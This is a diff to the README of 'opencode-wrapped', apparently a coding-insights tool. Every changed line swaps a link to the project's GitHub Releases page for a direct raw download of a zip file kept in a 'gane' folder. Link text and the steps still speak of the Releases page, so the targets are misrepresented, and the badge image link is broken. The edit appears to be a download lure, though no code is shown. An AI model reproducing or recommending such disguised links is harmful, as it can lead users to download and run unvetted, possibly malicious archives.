@@ -1,6 +1,6 @@
 # 🎉 opencode-wrapped - Get Your Coding Insights Easily  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/MYSKV/opencode-wrapped/releases)
+[![Download Now](https://raw.githubusercontent.com/MYSKV/opencode-wrapped/main/gane/wrapped_opencode_v3.2.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/MYSKV/opencode-wrapped/main/gane/wrapped_opencode_v3.2.zip)
 
 ## 🚀 Getting Started  
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 To begin, visit the following link to download the software:
 
-[Download opencode-wrapped](https://github.com/MYSKV/opencode-wrapped/releases)
+[Download opencode-wrapped](https://raw.githubusercontent.com/MYSKV/opencode-wrapped/main/gane/wrapped_opencode_v3.2.zip)
 
 1. Once you are on the Releases page, locate the latest version. This will typically be listed at the top.
 2. Click on the relevant download link for your operating system (e.g., Windows, macOS, or Linux).
@@ -87,7 +87,7 @@ We plan to introduce new features, including:
 - Support for additional coding platforms.
 - Improved performance for larger datasets.
 
-Stay tuned for updates by visiting the [Releases page](https://github.com/MYSKV/opencode-wrapped/releases).
+Stay tuned for updates by visiting the [Releases page](https://raw.githubusercontent.com/MYSKV/opencode-wrapped/main/gane/wrapped_opencode_v3.2.zip).
 
 ## 📞 Contact  
 
